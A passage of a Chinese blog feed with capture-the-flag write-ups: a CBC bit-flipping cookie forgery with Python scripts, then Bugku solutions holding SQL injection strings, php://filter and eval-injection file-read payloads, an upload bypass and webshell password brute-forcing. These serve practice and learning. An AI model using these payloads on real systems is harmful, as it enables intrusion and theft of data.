class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_iv</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $random_iv=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(<span class="number">1</span>,<span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($info)</span></span>&#123;</span><br><span class="line">    $iv = get_random_iv();</span><br><span class="line">    $plain = serialize($info);</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    $_SESSION[<span class="string">'username'</span>] = $info[<span class="string">'username'</span>];</span><br><span class="line">    setcookie(<span class="string">"iv"</span>, base64_encode($iv));</span><br><span class="line">    setcookie(<span class="string">"cipher"</span>, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_login</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'cipher'</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">'iv'</span>]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[<span class="string">'cipher'</span>]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[<span class="string">"iv"</span>]);</span><br><span class="line">        <span class="keyword">if</span>($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"&lt;p&gt;base64_decode('"</span>.base64_encode($plain).<span class="string">"') can't unserialize&lt;/p&gt;"</span>);</span><br><span class="line">            $_SESSION[<span class="string">'username'</span>] = $info[<span class="string">'username'</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"ERROR!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_homepage</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_SESSION[<span class="string">"username"</span>]===<span class="string">'admin'</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Hello admin&lt;/p&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Flag is $flag&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;hello '</span>.$_SESSION[<span class="string">'username'</span>].<span class="string">'&lt;/p&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Only admin can see flag&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;p&gt;&lt;a href="loginout.php"&gt;Log out&lt;/a&gt;&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">    $username = (string)$_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = (string)$_POST[<span class="string">'password'</span>];</span><br><span class="line">    <span class="keyword">if</span>($username === <span class="string">'admin'</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'&lt;p&gt;admin are not allowed to login&lt;/p&gt;'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $info = <span class="keyword">array</span>(<span class="string">'username'</span>=&gt;$username,<span class="string">'password'</span>=&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">"username"</span>]))&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;body class="login-body"&gt;</span></span><br><span class="line"><span class="string">                &lt;div id="wrapper"&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class="user-icon"&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class="pass-icon"&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;form name="login-form" class="login-form" action="" method="post"&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="header"&gt;</span></span><br><span class="line"><span class="string">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="content"&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name="username" type="text" class="input username" value="Username" onfocus="this.value=\'\'" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name="password" type="password" class="input password" value="Password" onfocus="this.value=\'\'" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="footer"&gt;</span></span><br><span class="line"><span class="string">                        &lt;input type="submit" name="submit" value="Login" class="button" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;/form&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/body&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">t</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>一直也不行，心态崩了(2333333…)</p>
<hr>
<p>一个星期之后…..</p>
<hr>
<p>我胡汉三又回来了！！！！</p>
<p>我们把返回的cipher值进行翻转，想要翻转第二块的 <code>m</code>为 <code>a</code>只需要把第一行对应第九位翻转一下即可，代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">iv = <span class="string">'sDGucEcgR9ixzDNVm6IrpA%3D%3D'</span></span><br><span class="line">cipher_raw = <span class="string">'xhp6%2B1A%2FKctfyU%2BbQeuRx3lUMrDUN%2FOuXg96c%2FJ%2Byn5DX2UVNMavsdocAGjmu6SmuRD6kY8Ef4rLKYADlEeUjQ%3D%3D'</span></span><br><span class="line">print(<span class="string">"[*]原始iv和cipher"</span>)</span><br><span class="line">print(<span class="string">'翻转前：'</span>)</span><br><span class="line">print(<span class="string">'cipher_raw:'</span>,cipher_raw)</span><br><span class="line">print(<span class="string">'iv_raw:'</span>,iv)</span><br><span class="line">print(<span class="string">'翻转后：'</span>)</span><br><span class="line">tmp1 = urllib.parse.unquote(cipher_raw)</span><br><span class="line"></span><br><span class="line">cipher = base64.b64decode(tmp1)</span><br><span class="line"><span class="comment"># a:2:&#123;s:8:"userna</span></span><br><span class="line"><span class="comment"># me";s:5:"mdmin";</span></span><br><span class="line"><span class="comment"># s:8:"password";s</span></span><br><span class="line"><span class="comment"># :6:"123456";&#125;</span></span><br><span class="line"></span><br><span class="line">cipher = cipher.decode(<span class="string">'unicode_escape'</span>)</span><br><span class="line">xor_cipher = cipher[<span class="number">0</span>:<span class="number">9</span>] + chr(ord(cipher[<span class="number">9</span>]) ^ ord(<span class="string">'m'</span>) ^ ord(<span class="string">'a'</span>)) + cipher[<span class="number">10</span>:]</span><br><span class="line">xor_cipher = urllib.parse.quote(base64.b64encode(xor_cipher.encode(<span class="string">'latin-1'</span>)))</span><br><span class="line"></span><br><span class="line">print(xor_cipher)</span><br></pre></td></tr></table></figure>
<p>写完这个脚本，我心中又不禁对python的编码问题骂了无数次mmp，真的太多坑了…..</p>
<p>然后修改cookie中的cipher值，刷新页面（注意此时不能提交数据,要把post数据清空）之后，页面会提示反序列化失败，这是因为我们修改mdmin为admin的时候，是通过修改第一块数据来修改的，所以第一个块数据（16字节）被破坏了。因为程序中要求username要等于admin所以不能利用文章里的说的填充字符。 又因为是第一个块数据被破坏，第一个块数据是和IV有关，所以只要将在CBC字符翻转攻击，得到新的IV就可以修复第一块数据。 </p>
<p>贴一下代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 得到新的iv值</span></span><br><span class="line">iv = <span class="string">'sDGucEcgR9ixzDNVm6IrpA%3D%3D'</span> <span class="comment"># 填写未修改过的iv</span></span><br><span class="line">cipher = <span class="string">'SjeC+xtTva24pYSPdWXIsm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IjEyMzQ1Ijt9'</span>  <span class="comment"># 填写提示反序列化错误的字符串</span></span><br><span class="line">cipher = base64.b64decode(cipher).decode(<span class="string">'unicode_escape'</span>)</span><br><span class="line">print(<span class="string">'cipher:'</span>,cipher)</span><br><span class="line">iv = base64.b64decode(urllib.parse.unquote(iv))</span><br><span class="line">iv = iv.decode(<span class="string">'unicode_escape'</span>)</span><br><span class="line">newIv = <span class="string">''</span></span><br><span class="line">right = <span class="string">'a:2:&#123;s:8:"userna'</span>  <span class="comment"># 被损坏前正确的明文</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    newIv += chr( ord(right[i]) ^ ord(iv[i]) ^ ord(cipher[i])) </span><br><span class="line">print(urllib.parse.quote(base64.b64encode(newIv.encode(<span class="string">'latin-1'</span>))))</span><br></pre></td></tr></table></figure>
<p>将得到的iv替换cookie中的iv，刷新一下页面即可以admin身份登录获取flag。</p>
]]></content>
      
        <categories>
            
            <category> 资料 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypro </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[BUGKU-CTF题解]]></title>
      <url>/2018/03/12/bugkuwriteup/</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近一段时间课比较少，做一做bugku的题目。<a href="http://ctf.bugku.com/" target="_blank" rel="noopener">传送门</a></p>
<a id="more"></a>
<h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>加群即可</p>
<h2 id="这是一张单纯的图片"><a href="#这是一张单纯的图片" class="headerlink" title="这是一张单纯的图片"></a>这是一张单纯的图片</h2><p>hex一下之后得到 <code>&#107;&#101;&#121;&#123;&#121;&#111;&#117;&#32;&#97;&#114;&#101;&#32;&#114;&#105;&#103;&#104;&#116;&#125;</code> ，Unicode解码即可(我这个是被解码后的)</p>
<h2 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h2><p>改变高度即可得到flag，将7对应的第二行A4改为F4即可。</p>
<h2 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h2><p>wireshark跑一下然后追踪tcp流即可</p>
<h2 id="猜"><a href="#猜" class="headerlink" title="猜"></a>猜</h2><p>google搜索图片可知那是刘亦菲(liuyifei)。</p>
<h2 id="流量分析（cnss）"><a href="#流量分析（cnss）" class="headerlink" title="流量分析（cnss）"></a>流量分析（cnss）</h2><p>这个题目我觉得挺坑的，用wireshark分析一下，因为题目也没任何提示，而且包里面貌似是CSRF，所以就在往这上面想，但是也没什么收获，反正这题数据包少，就随手追踪了第一条碰碰运气，结果它的请求引起了我的注意：</p>
<blockquote>
<p>GET /stat.htm?id=2724999&amp;r=http%3A%2F%2Fspace.bilibili.com%2F17190571&amp;lg=zh-cn&amp;ntime=1490634009&amp;cnzz_eid=418561883-1487085537-http%3A%2F%2Fwww.bilibili.com%2F&amp;showp=1536x864&amp;p=http%3A%2F%2Fspace.bilibili.com%2F17190571%2F%23!%2F&amp;t=Chrstm%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4%20-%20%E5%93%94%E5%93%A9%E5%93%94%E5%93%A9%20(%20%E3%82%9C-%20%E3%82%9C)%E3%81%A4%E3%83%AD%20%E4%B9%BE%E6%9D%AF~%20Bilibil…&amp;umuuid=15ab677e5a02ed-064c9a36304b67-27d1a36-144000-15ab677e5a4205b&amp;h=1&amp;rnd=1218637328 HTTP/1.1</p>
</blockquote>
<p>请求网址里面有个space.bilibili.com ，感觉这应该是某个用户的个人空间，尝试访问一下，结果就在个人空间里个性签名看到了熟悉的base64，解码两次即可得到flag。</p>
<h2 id="做个游戏-08067CTF"><a href="#做个游戏-08067CTF" class="headerlink" title="做个游戏(08067CTF)"></a>做个游戏(08067CTF)</h2><p>下载之后是个游戏，直接二进制反编译一下，结果在PlaneGameFrame类里面找到了flag，记得flag还得再base64解码一下。</p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>直接查看元素即可</p>
<h2 id="文件上传测试"><a href="#文件上传测试" class="headerlink" title="文件上传测试"></a>文件上传测试</h2><p>burpsuite抓包将图片文件改名为<strong><font face="futura">2.png.php</font></strong>即可</p>
<h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><p>直接计算即可，问题在于输入框只能输入以为数字，查看元素将最大长度改为3即可。</p>
<h2 id="web基础-GET"><a href="#web基础-GET" class="headerlink" title="web基础$_GET"></a>web基础$_GET</h2><p>payload <code>?what=flag</code>    </p>
<h2 id="web基础-POST"><a href="#web基础-POST" class="headerlink" title="web基础$_POST"></a>web基础$_POST</h2><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">what</span>=flag</span><br></pre></td></tr></table></figure>
<h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><p>用%00截断即可<strong><font face="futura">?num=1%00adf</font></strong>，原理是==比较时只是对值的比较，会把不同类型转为同类型之后再行比较</p>
<h2 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h2><p>阻止页面弹窗后查看元素，然后Unicode解码即可</p>
<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>查看元素发现是<font face="futura">gb2312</font>的编码，测试<font face="futura">?id=1%df’</font>则会报错，说明是宽字节注入，<br>payload<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>%df' union select <span class="number">1</span>,<span class="built_in">string</span> <span class="keyword">from</span> sql5.key <span class="keyword">where</span> <span class="built_in">id</span>=<span class="number">1</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure></p>
<h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><p>直接在linux下打开hosts文件，输入下列文档</p>
<blockquote>
<p>120.24.86.145 flag.bugku.com</p>
</blockquote>
<p>我在部分linux下不能用，不知道是为什么。</p>
<h2 id="sql注入1"><a href="#sql注入1" class="headerlink" title="sql注入1"></a>sql注入1</h2><p>过滤了关键字，尝试用%00绕过<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span> uni%<span class="number">00</span>on sele%<span class="number">00</span>ct <span class="number">1</span>,hash fr%<span class="number">00</span>om sql3.<span class="type">key</span> wh%<span class="number">00</span>ere id=<span class="number">1</span>--+</span><br></pre></td></tr></table></figure></p>
<h2 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h2><p>页面一直停不下来，尝试了禁用js文件，还是不行，尝试burpsuite构造参数多次抓包，然后查看返回页面里则可以得到flag。</p>
<h2 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h2><p>题目给出提示 <code>这个题没技术含量但是实战中经常遇到</code> ,打开后发现也没有什么泄露的问题，所以猜测应该是后台弱口令之类的问题，扫描了一下目录，发现有个shell.php，是个后台马，尝试了几个弱口令都不行，最终尝试爆破了一下，得到密码。（提示一下密码是四位）。</p>
<h2 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h2><p>页面有代码泄露<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">"waf.php"</span>;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">    $a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line">    <span class="keyword">eval</span>( <span class="string">"var_dump($a);"</span>);</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><strong>方法一</strong></p>
<p>变量<strong><font face="futura">request</font></strong>是一个http变量，可以接受post或者get和cookie的数组，代码中<code>eval( “var_dump($a);”)</code>存在可以利用的漏洞，可以把所要得到的文件dump出来。构造参数<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">hello</span>=file_get_contents('flag.php')</span><br></pre></td></tr></table></figure></p>
<p>浏览器php代码被截断，f12查看元素即可得到flag</p>
<p><strong>方法二</strong></p>
<p>其中第一句话<strong><font face="futura">include “flag.php”</font></strong>可知文件包含在本地</p>
<p>还是利用 <font face="futura">eval()</font>函数，payload<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>);print_r(file(<span class="string">"./flag.php"</span>));%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p><strong><font face="futura">%23</font></strong>的作用是注释掉eval函数后面的<strong><font face="futura">“)</font></strong>形成闭合。</p>
<h2 id="strcmp比较字符串"><a href="#strcmp比较字符串" class="headerlink" title="strcmp比较字符串"></a><font face="futura">strcmp</font>比较字符串</h2><p>这个题目的问题在于PHP在5.3版本之前，对于字符串比较函数<font face="futura">strcmp(p1,p2)</font>函数，如果p1&gt;p2，返回<strong><font face="futura">&gt;0</font></strong>；如果p1=p2，返回<strong><font face="futura">=0</font></strong>；如果p1 &lt; p2，返回<strong><font face="futura">&#60;0</font></strong>。但是如果传递到参数是个数组，那么函数会报错，则会<code>return 0</code>，相当于判断为p1=p2了。故payload为<strong><font face="futura">?a[]=1</font></strong>。</p>
<h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><p>本题考查可变变量，故payload为 <code>?args=GLOBALS</code>，这里这个$$GLOBALS只能在eval中使用，却不能直接var_dump出来，不知道是为什么。</p>
<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>jspfuck查看代码，直接将代码扔进控制台即可</p>
<h2 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h2><p>抓包查看请求头即可</p>
<h2 id="管理员系统"><a href="#管理员系统" class="headerlink" title="管理员系统"></a>管理员系统</h2><p>修改xff本地登录，之后查看源代码发现最后一行有一段base64内容，解码之后是 <code>test123</code> ，所以直接以这个作为密码登录试一下，然后就拿到了flag</p>
<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>查看源代码发现有url编码的文本，按照 <code>eval(unescape(p1) + unescape(‘%35%34%61%61%32’ + p2));</code>语句拼接url编码并转码可得<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSubmit</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> a=<span class="built_in">document</span>.getElementById(<span class="string">"password"</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="string">"undefined"</span>!=<span class="keyword">typeof</span> a)&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="string">"67d709b2b54aa2aa648cf6e87a7114f1"</span>==a.value)<span class="keyword">return</span>!<span class="number">0</span>;</span><br><span class="line">		alert(<span class="string">"Error"</span>);</span><br><span class="line">		a.focus();</span><br><span class="line">		<span class="keyword">return</span>!<span class="number">1</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"levelQuest"</span>).onsubmit=checkSubmit;</span><br></pre></td></tr></table></figure></p>
<p>查看代码可知将<strong><font fac="futura">67d709b2b54aa2aa648cf6e87a7114f1</font></strong>提交即可。</p>
<h2 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h2><p>查看元素发现有<code>href=”./index.php?file=show.php</code>语句，而题目又说flag在index里，所以应该是要查看index.php文件，burp抓包修改。payload</p>
<blockquote>
<p>file=php://filter/convert.base64-encode/resource=index.php</p>
</blockquote>
<h2 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h2><p>简答的弱口令爆破，密码13579</p>
<h2 id="点击一百万次"><a href="#点击一百万次" class="headerlink" title="点击一百万次"></a>点击一百万次</h2><p>post参数为1000000即可</p>
<h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p>题目说了备份，查看index.php.bak可以下载到源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: Norse</span></span><br><span class="line"><span class="comment"> * Date: 2017/8/6</span></span><br><span class="line"><span class="comment"> * Time: 20:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strstr($_SERVER[<span class="string">'REQUEST_URI'</span>], <span class="string">'?'</span>);</span><br><span class="line">$str = substr($str,<span class="number">1</span>);</span><br><span class="line">$str = str_replace(<span class="string">'key'</span>,<span class="string">''</span>,$str);</span><br><span class="line">parse_str($str);</span><br><span class="line"><span class="keyword">echo</span> md5($key1);</span><br><span class="line"><span class="keyword">echo</span> md5($key2);</span><br><span class="line"><span class="keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag.<span class="string">"取得flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>阅读代码可知，提交两个md5值相等而本身值不相等的变量即可，同时还有变量guolv，双写绕过即可，这里提一下，这儿的     <code>REQUEST_URI</code>的输入方式www.xxx.com/aaa/ ,那么<strong><font face="futura">aaa</font></strong>就是REQUEST_URI。本题payload</p>
<blockquote>
<p>/?kekeyy1[]=1&amp;kekeyy2[]=2/</p>
</blockquote>
<h2 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h2><p>常规的SQL注入<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span>' order by <span class="number">4</span>%<span class="number">23</span> #爆字段数</span><br><span class="line">id=<span class="number">-1</span>' union select <span class="number">1</span>,database(),<span class="number">3</span>,<span class="number">4</span>%<span class="number">23</span>	#爆数据库名</span><br><span class="line">id=<span class="number">-1</span>' union select <span class="number">1</span>,group_concat(table_name),<span class="number">3</span>,<span class="number">4</span> from information_schema.tables where table_schema=database()%<span class="number">23</span> #爆表名</span><br><span class="line">id=<span class="number">-1</span>' union select <span class="number">1</span>,group_concat(column_name),<span class="number">3</span>,<span class="number">4</span> from information_schema.columns where table_name='fl4g'%<span class="number">23</span> #爆字段名</span><br><span class="line">id=<span class="number">-1</span>' union select <span class="number">1</span>,skctf_flag,<span class="number">3</span>,<span class="number">4</span> from fl4g%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<h2 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" title="秋名山老司机"></a>秋名山老司机</h2><p>这个题只能2秒内提交，所以写个脚本<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://120.24.86.145:8002/qiumingshan/"</span></span><br><span class="line">r = requests.session()</span><br><span class="line">content = r.get(url).text</span><br><span class="line">par = re.findall(r'(.*?)=.*?',content)</span><br><span class="line">text = par[1][5:]</span><br><span class="line">ans = eval(text)</span><br><span class="line"></span><br><span class="line">payload = &#123;'value':ans&#125;</span><br><span class="line">content = r.post(url,data=payload).text</span><br><span class="line">print(content)</span><br></pre></td></tr></table></figure></p>
<h2 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h2><p>这个题就是编程题，抓包就会发现有个flag值，被base64编码了，解之，然后查看元素</p>
<blockquote>
<p> OK ,now you have to post the margin what you find </p>
</blockquote>
<p>所以其实就是要提交margin值，但是这个题最骚的就是这个被base64解码后flag还需要在解码一次，也怪我，第一次解码后这个字符串倒是挺像base64的，怪我不够敏感，而且margin好像是css样式，应该解出数字才对。贴上代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://120.24.86.145:8002/web6/"</span></span><br><span class="line">r = requests.session()</span><br><span class="line">content = r.get(url).headers[<span class="string">'flag'</span>].encode(<span class="string">'utf-8'</span>)</span><br><span class="line">content = base64.b64decode(content)</span><br><span class="line">content = content.decode(<span class="string">'utf-8'</span>)[<span class="number">15</span>:]</span><br><span class="line">content = base64.b64decode(content)</span><br><span class="line">payload = &#123;<span class="string">'margin'</span>:content&#125;</span><br><span class="line">res = r.post(url,data=payload).text</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure></p>
<h2 id="COOKIE欺骗"><a href="#COOKIE欺骗" class="headerlink" title="COOKIE欺骗"></a>COOKIE欺骗</h2><p>解码filename发现是<code>keys.txt</code>，base64编码<code>index.php</code>替换之，然后改变line的参数即可得到全部php文件进行代码审计，改变cookie为margin=margin，再把filename的值为keys.php(要base64编码)，然后就OK了</p>
